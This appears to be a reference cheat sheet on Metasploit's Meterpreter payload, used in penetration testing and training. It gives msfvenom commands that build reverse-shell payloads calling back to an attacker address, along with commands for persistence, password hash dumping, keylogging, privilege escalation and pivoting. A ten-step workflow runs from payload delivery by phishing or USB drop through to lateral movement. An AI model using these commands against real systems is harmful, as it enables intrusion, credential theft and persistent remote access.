# Metasploit Meterpreter

## Purpose
Meterpreter (Meta-Interpreter) is an advanced in-memory payload that operates within the Metasploit Framework. Unlike traditional payloads that spawn a new process or connect back via a shell, Meterpreter runs entirely in memory, injects into a victim process, and provides an extensible command interpreter for post-exploitation. It supports file system manipulation, privilege escalation, persistence mechanisms, pivoting, keylogging, screen capture, and many other post-exploitation capabilities.

## Installation
Meterpreter is part of the Metasploit Framework and does not require separate installation. Payloads are generated using MSFvenom:
```bash
# Generate a Meterpreter reverse TCP payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe

# Generate a staged Linux Meterpreter payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o payload.elf

# Generate PowerShell one-liner
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f psh-reflection -o payload.ps1

# Web delivery (staged delivery via PowerShell)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o /var/www/html/payload.exe
```

## Payload Types
- **Stage vs Stageless**: Staged payloads (`meterpreter/reverse_tcp`) send a small stager first, then download the full Meterpreter DLL. Stageless payloads (`meterpreter_reverse_tcp`) include the full code but are larger.
- **Transport Protocols**: reverse_tcp, reverse_http, reverse_https, bind_tcp
- **Platforms**: Windows (x86/x64), Linux (x86/x64/ARM), macOS, Android, PHP, Python, Java

## Important Commands
- **Core**: `help`, `background`, `exit`, `getuid`, `sysinfo`, `getpid`, `migrate <PID>`, `getprivs`
- **File System**: `pwd`, `ls`, `cd`, `cat`, `upload`, `download`, `edit`, `rm`, `mkdir`, `search -f *.docx`
- **Privilege Escalation**: `getsystem`, `steal_token <PID>`, `bypassuac`, `screenshot`, `keyscan_start/keyscan_dump`
- **Persistence**: `persistence -X -i 5 -p 4444 -r 10.10.10.1`, `run persistence -h`
- **Network**: `ipconfig`, `route`, `portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 10.10.10.20`, `arp`, `netstat`
- **Passwords**: `hashdump`, `run post/windows/gather/smart_hashdump`, `creds_all`
- **Lateral Movement**: `run post/windows/gather/enum_domains`, `run post/windows/gather/enum_shares`, `psexec`
- **Pivoting**: `route add <subnet> <netmask> <session>`, `portfwd add`

## Typical Workflow
1. Generate a Meterpreter payload and deliver it to the target (phishing, exploitation, or USB drop)
2. Set up a Metasploit handler: `use exploit/multi/handler` with the matching payload configuration
3. Once the target executes the payload, a Meterpreter session opens in msfconsole
4. Run `sysinfo` and `getuid` to understand the target environment
5. Migrate to a stable process (e.g., `explorer.exe`, `svchost.exe`): `migrate -N explorer.exe`
6. Attempt privilege escalation: `getsystem` (uses multiple techniques automatically)
7. Dump password hashes: `hashdump` or `run post/windows/gather/smart_hashdump`
8. Set up persistence if needed: `run persistence -X -i 30 -p 4444 -r <attacker_ip>`
9. Use the session as a pivot point: `route add <internal_subnet> <netmask> <session_id>`
10. Background the session and exploit other machines through the pivot

## Advantages
- Completely in-memory operation (no files written to disk, stealthier than traditional payloads)
- Encrypted communication channel (AES-256 encrypted C2)
- Extensible via plugins and scripts (Railgun for direct Win32 API calls)
- Channelized communication (multiple concurrent operations)
- Built-in privilege escalation (getsystem uses token duplication and service exploits)
- Pivoting capabilities for network traversal through compromised hosts
- Supports both staged and stageless payloads for flexibility
- Automatic process migration after initial exploitation

## Limitations
- Heavily signatured by modern AV/EDR solutions (requires obfuscation or custom shellcode)
- Memory scanning can detect Meterpreter artifacts in process memory
- Large payloads may exceed available stager size limitations
- Requires Metasploit handler for communication (no standalone C2)
- HTTP/HTTPS payloads have distinct network fingerprints
- Android/iOS Meterpreter has limited functionality compared to desktop
- Some post-exploitation modules crash older Windows versions

## Industry Use
Meterpreter is the standard post-exploitation payload used by penetration testers during internal assessments, by red teams for C2 operations (often obfuscated), in CTF competitions, and in training environments for learning post-exploitation techniques.

## Official Documentation
- Metasploit Docs: https://docs.metasploit.com
- Meterpreter Wiki: https://github.com/rapid7/metasploit-framework/wiki/Meterpreter
- MSFvenom Guide: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- Post-Exploitation Modules: https://www.rapid7.com/db/modules/
